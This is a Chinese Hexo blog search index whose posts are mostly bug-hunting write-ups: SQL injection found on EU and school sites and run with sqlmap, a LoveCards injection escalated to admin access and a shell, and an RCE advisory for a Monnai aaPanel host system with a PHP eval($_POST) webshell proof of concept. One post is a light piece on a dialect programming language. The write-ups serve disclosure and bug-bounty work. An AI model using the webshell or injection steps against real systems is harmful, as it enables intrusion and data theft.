<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次对欧盟的挖洞--尝试登榜欧盟名人堂</title>
    <link href="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/"/>
    <url>/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>前两天看到朋友圈有佬登上了欧盟名人堂 <a href="https://cert.europa.eu/hall-of-fame">Hall of fame</a>，然后看了一下欧盟的<a href="https://cert.europa.eu/coordinated-vulnerability-disclosure-policy">漏洞纰漏政策</a>，决定尝试一下</p><h1 id="开始挖洞"><a href="#开始挖洞" class="headerlink" title="开始挖洞"></a>开始挖洞</h1><p>首先灯塔结合OneForAll收集europa.eu这个根域名下所有的子域名,建议还可以尝试搭配sublife等，尽量收集一个全面的欧盟子域名。<br><img src="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/1.png" alt="1"></p><p>挑中了一个幸运儿，经过测试发现存在XSS和SQL注入漏洞(欧盟好多网站没有waf是我没想到的）</p><p><img src="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/2.png" alt="2"></p><p>具体怎么挖洞就不说了，能看到我这个小破博客的应该不是外行就是同行大佬  </p><p>满怀欣喜的给CERT写邮件，还专门润色了好几遍，主打的就是一个舔狗</p><p><img src="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/3.png" alt="3"><br><img src="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/4.png" alt="4"></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>WELL DONE，告诉我漏洞已经被交过了<br><em>We would like to thank you for reporting this issue to us. Additionally we would like to inform you that other researchers already have reported the same issue to us.</em><br><img src="/2024/06/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%AC%A7%E7%9B%9F%E7%9A%84%E6%8C%96%E6%B4%9E/5.png" alt="5"></p><p>唉</p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>欧盟</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>东北方言编程语言给我整乐了--滚犊子吧你整的啥输入啊？</title>
    <link href="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/"/>
    <url>/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>最近看到一个有意思的开源项目<strong>dongbei</strong>，主要功能就是使用东北话来编写代码。</p><p>按项目说明 “dongbei” 是一种以东北方言词汇为基础的编程语言，它填补了世界方言编程领域的空白。</p><p>这个定义整的可以，气势宏大，口号也很川普风：</p><p>学编程，就整东北浪！</p><p><em><strong>Make dongbei Great Again !!!</strong></em></p><p>项目开源地址：<a href="https://github.com/zhanyong-wan/dongbei">https://github.com/zhanyong-wan/dongbei</a></p><p>该项目基于 Python3 ，所以安装起来也特别简单:</p><p><code>pip3 install dongbei-lang</code></p><p>执行以上命令出现以下信息就说明安装成功，可以开始使用了：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/1.png" alt="1"></p><p>接下来就让我们来试试怎么用东北话写出招笑的小代码，首先创建一个 test.dongbei，文件后缀名设置为 .dongbei 可以更容易分辨，然后把以下代码复制到 test.dongbei 文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env dongbei</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># 这是一个 dongbei 语言程序的例子。</span><br><span class="hljs-comment"># 所有 # 后面的字符都是注释。</span><br><br><span class="hljs-comment"># 演示如何打印消息。</span><br><br>嘀咕：“唉呀，这嘎哒真他妈那啥！”。<br></code></pre></td></tr></table></figure><p>接下来执行以下代码：</p><p><code>dongbei test.dongbei</code></p><p>就可以看到输出结果：<strong>唉呀，这嘎哒真他妈那啥！</strong>  </p><p>另外你如果想东北人唠嗑，刚好你身边又没有东北朋友，这时候就可以开启它的唠嗑模式，输入 dongbei 命令进入唠嗑模式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dongbei</span><br>你要跟 dongbei 大哥唠嗑啊？开整吧！要是一句话太长咧你就用\拆开唠。<br>你瞅啥？<br></code></pre></td></tr></table></figure><p>这个唠嗑模式其实就是命令行模式，看下一个测试实例：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">你要跟 dongbei 大哥唠嗑啊？开整吧！要是一句话太长咧你就用<span class="hljs-string">\拆开唠。</span><br>你瞅啥？<span class="hljs-number">2</span> 加 <span class="hljs-number">2</span><br><span class="hljs-number">4</span><br>你瞅啥？瞅你咋地<br>完犊子了！<br></code></pre></td></tr></table></figure><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/2.png" alt="2"></p><p>作为新编程语言，很多编辑器默认都不支持代码高亮功能，刚开始学习 VS Code 的代码显示如下：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/3.png" alt="3"></p><p>非常不方便学习，没关系了，VS Code 上可以安装 dongbei  语言的高亮插件：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/4.png" alt="4"></p><p>安装完成后，回到我们之前的测试代码，完美高亮：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/5.png" alt="5"></p><p>我们再让他试试基本的算术运算：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/6.png" alt="6"></p><p>输出结果：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff">263<br>10<br>50.0<br>2.0<br><span class="hljs-deletion">-50.0</span><br></code></pre></td></tr></table></figure><p>接下来我们再整个复杂的《斐波那契数列》，代码如下：</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/7.png" alt="7"></p><p>测试输出结果如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">瞅瞅<span class="hljs-number">0</span>的结果：<br>你整的啥输入啊？<br>瞅瞅<span class="hljs-number">15</span>的结果：<br><span class="hljs-number">1、1、2、3</span>、<span class="hljs-number">5、8、13、21</span>、<span class="hljs-number">34、55、89、144</span>、<span class="hljs-number">233、377</span>、<span class="hljs-number">610</span><br></code></pre></td></tr></table></figure><p>目前来说这个开源项目一般也是仅供我们娱乐使用，真正实际应用看着也挺奇怪的，也许可能英文字母编程看习惯了？毕竟这几十年都是欧美主导世界。<br>什么时候等某人称霸中国了，让世界也来学学东北编程、文言文编程、四川话编程🤣</p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/8.png" alt="8"></p><p><img src="/2024/05/18/%E4%B8%9C%E5%8C%97%E6%96%B9%E8%A8%80%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%BB%99%E6%88%91%E6%95%B4%E4%B9%90%E4%BA%86-%E6%BB%9A%E7%8A%8A%E5%AD%90%E5%90%A7%E4%BD%A0%E6%95%B4%E7%9A%84%E5%95%A5%E8%BE%93%E5%85%A5%E5%95%8A%EF%BC%9F/9.png" alt="9"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/QGZEXvBryNbu6YYbfqPn0g">https://mp.weixin.qq.com/s/QGZEXvBryNbu6YYbfqPn0g</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次歪打正着的edusrc挖洞</title>
    <link href="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/"/>
    <url>/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近在忙着弄Hexo，经常收到edusrc上新礼品的通知，晚上闲的没事看看能不能投机取巧刷几分</p><h1 id="寻找目标"><a href="#寻找目标" class="headerlink" title="寻找目标"></a>寻找目标</h1><p>翻了一下最近几天的漏洞列表，发现大部分都是大佬用0day和通杀刷分</p><p>突然我发现了目标，说不定可以捡个漏<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/1.png" alt="1"></p><p>这种落单的乡镇中学的官网，一般只要不是使用的建站系统，都有洞可挖</p><p>打开fofa，直接复制学校名搜索<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/2.png" alt="2"><br>一共四个资产，其中最后学校官网为第三方系统搭建，为了快速刷分直接放弃</p><h1 id="开始挖洞"><a href="#开始挖洞" class="headerlink" title="开始挖洞"></a>开始挖洞</h1><p><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/3.png" alt="3"></p><p>首先测试一波最直观的SQL注入漏洞</p><p>打开我们最喜欢的burpsuite，启动xia sql插件</p><p>复制资产URL，填到bp内置浏览器里</p><p>然后无脑瞎点，发现用户注册页面有一个下拉选择学校列表的功能</p><p>直觉告诉我这里有搞头，丢插件测试一波</p><p><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/4.png" alt="4"></p><p>继续无脑，sqlmap启动！</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -r <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--random-agent</span> <span class="hljs-attr">--threads</span> <span class="hljs-number">10</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>爆金币啦<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/5.png" alt="5"></p><p>直接拿下，不过可惜不是dba<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/6.png" alt="6"></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>还剩下2个站，依次点开看了下都是一样的，直接重复又拿到两个sql注入</p><p>edusrc捡漏刷分成功*3<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/7.png" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>edusrc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LoveCards表白墙SQL注入漏洞</title>
    <link href="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>拿到站后开始对该表白墙系统进行常规渗透测试。在搜索页发现”等符号会被转义<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p><p>然后后台跑了一波字典无果，正打算放弃，bp插件给我返回了一个err </p><p>“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘111.xx.xx.106” at line 1″<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p><p>都到眼前了，直接sqlmap一把梭<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p><p>看了一下不是dba，那就直接翻翻数据库<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><p>找到后台密码了，解密让我无语的md5<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p><p>进入后台</p><p>文件上传一键getshell~<br><img src="/2023/10/20/LoveCards%E8%A1%A8%E7%99%BD%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梦奈宝塔主机系统RCE</title>
    <link href="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/"/>
    <url>/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="A-vulnerability-about-incorrect-access-control-and-remote-code-execution"><a href="#A-vulnerability-about-incorrect-access-control-and-remote-code-execution" class="headerlink" title="A vulnerability about incorrect access control and remote code execution."></a>A vulnerability about incorrect access control and remote code execution.</h1><p>The V1.5 version of the Monnai aaPanel host system(梦奈宝塔主机系统) has incorrect access control and remote code execution.</p><span id="more"></span><p>This is a system that converts the aaPanel(bt.cn) into some virtual hosts and provides an operation panel. Upload the PHP Trojan to the virtual host directory of the system, and use some tools (such as AntSword) to access the website directory of all users of the system and could acqiure 777 permissions.</p><p>And remote code execution is also possible without disabling certain functions.</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-title function_ invoke__">phpversion</span>();<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>Then use a Webshell management tool to connect shell.(I use AntSword)</p><p><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/1.png" alt="1"><br>After that, into FileManage, we can see the website path is &#x2F;www&#x2F;wwwroot&#x2F;mnbt.229741e07&#x2F;</p><p><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/2.png" alt="2"></p><p>Return to the parent directory, we can see the list of all websites. All of these have acqiured 755 permissions automatically.  </p><p>Even though these websites has been renamed to other names, we can still use a PHP function to get the URL.</p><p>By the way, we can also execute some code such as phpinfo() or phpversion().</p><p>Via the shell url:<br><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/3.png" alt="3"></p><p>We’ve get the page’s url(at the top of this page) and execute the phpinfo() and phpversion() code successfully!</p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>POC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习强国被爆出多个后门及漏洞</title>
    <link href="/2022/09/09/%E5%AD%A6%E4%B9%A0%E5%BC%BA%E5%9B%BD%E8%A2%AB%E7%88%86%E5%87%BA%E5%A4%9A%E4%B8%AA%E5%90%8E%E9%97%A8%E5%8F%8A%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/09/09/%E5%AD%A6%E4%B9%A0%E5%BC%BA%E5%9B%BD%E8%A2%AB%E7%88%86%E5%87%BA%E5%A4%9A%E4%B8%AA%E5%90%8E%E9%97%A8%E5%8F%8A%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="学习强国被爆含有包括信息收集、代码执行等多个漏洞及后门"><a href="#学习强国被爆含有包括信息收集、代码执行等多个漏洞及后门" class="headerlink" title="学习强国被爆含有包括信息收集、代码执行等多个漏洞及后门"></a>学习强国被爆含有包括信息收集、代码执行等多个漏洞及后门</h1><ul><li>SGN-01-001 Information gathering (Assumed)  </li><li>SGN-01-002 File transmission and protection (Evident)  </li><li>SGN-01-003 Code execution and backdoors (Evident)  </li><li>SGN-01-004 Obfuscation for hiding functionality (Proven)  </li><li>SGN-01-005 Collaboration with external companies (Evident)  </li><li>SGN-01-006 Similarities &amp; differences to other spy apps(Unclear)</li></ul><h1 id="详细分析见分析报告"><a href="#详细分析见分析报告" class="headerlink" title="详细分析见分析报告"></a>详细分析见分析报告</h1><p>报告下载：<a href="analysis_report_sgn.pdf">analysis_report_sgn.pdf</a>  </p><blockquote><p>来自 <a href="http://cure53.de/">cure53</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习强国</tag>
      
      <tag>后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
